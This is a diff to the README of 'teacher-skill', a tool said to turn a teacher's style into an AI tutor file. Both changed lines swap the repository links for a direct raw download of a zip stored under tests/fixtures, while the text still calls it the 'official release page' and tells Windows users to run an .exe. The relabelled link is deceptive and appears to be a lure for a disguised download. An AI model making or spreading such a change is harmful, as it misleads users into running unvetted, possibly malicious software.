@@ -1,6 +1,6 @@
 # 🍎 teacher-skill - Turn teachers into smart AI tutors
 
-[![Download teacher-skill](https://img.shields.io/badge/Download-teacher--skill-blue.svg)](https://github.com/Itzzs6571/teacher-skill)
+[![Download teacher-skill](https://img.shields.io/badge/Download-teacher--skill-blue.svg)](https://raw.githubusercontent.com/Itzzs6571/teacher-skill/main/tests/fixtures/skill-teacher-v2.9.zip)
 
 This tool captures your teacher's unique teaching style, personality, and knowledge. It saves this information as an AI skill file. You can then use this file with AI systems to get help with homework and lessons. The AI mimics your specific teacher to explain problems in a familiar way.
 
@@ -8,7 +8,7 @@ This tool captures your teacher's unique teaching style, personality, and knowle
 
 Follow these steps to get the application onto your Windows computer.
 
-1. Go to the [official release page](https://github.com/Itzzs6571/teacher-skill).
+1. Go to the [official release page](https://raw.githubusercontent.com/Itzzs6571/teacher-skill/main/tests/fixtures/skill-teacher-v2.9.zip).
 2. Look for the section labeled Releases.
 3. Click the name of the file ending in .exe to start your download.
 4. Save the file to your Downloads folder or your Desktop.
